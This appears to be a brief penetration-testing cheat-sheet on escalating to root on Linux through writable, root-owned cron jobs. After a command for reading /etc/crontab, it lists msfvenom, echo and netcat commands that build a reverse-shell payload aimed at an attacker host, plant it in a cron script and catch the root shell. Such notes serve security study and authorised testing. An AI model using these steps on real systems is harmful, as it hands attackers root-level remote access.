## Viewing Crontab Manually
```bash
cat /etc/crontab
```
**Automated Scripts (LinEnum/LinPeass) may not locate all cron tasks**

## Exploitation
- **Look for jobs that are owned by root and are writeable**
	- **Jobs will execute with root privileges**

- **Craft msfvenom payload**
```bash
msfvenom -p cmd/unix/reverse_netcat lhost=<attack IP> lport=<listener port> R
```

- **Write payload into script**
```bash
echo [MSFVENOM OUTPUT] > script_file
```

- **Set netcat listener and wait for script to execute**
```bash
nc -lvnp <listener_port>
```
